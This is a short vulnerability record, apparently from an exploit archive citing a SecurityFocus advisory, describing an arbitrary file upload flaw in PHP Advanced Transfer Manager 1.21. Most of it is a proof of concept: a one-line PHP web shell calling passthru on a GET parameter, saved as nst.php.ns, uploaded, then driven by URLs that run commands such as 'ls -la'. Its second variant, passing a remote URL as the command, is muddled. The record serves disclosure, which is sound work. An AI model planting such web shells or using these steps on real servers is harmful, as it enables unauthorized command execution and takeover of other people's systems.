@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/13542/info
+
+PHP Advanced Transfer Manager is prone to a vulnerability regarding the uploading of arbitrary files.
+
+If successfully exploited, an attacker can execute arbitrary script code on a vulnerable server. This can lead to unauthorized access in the context of the affected server.
+
+This issue reportedly affects PHP Advanced Transfer Manager version 1.21; earlier versions may also be vulnerable. 
+
+Create file:
+nst.php.ns
+
+<pre>
+<?
+passthru($_GET['nst']);
+?>
+
+Then upload, and go to http://www.example.com/files/nst.php.ns?nst=ls -la
+
+or
+
+<?
+passthru($_GET['nst']);
+?>
+
+Then upload, and go to http://example.com/files/nst.php.ns?nst=http://your/file.txt 
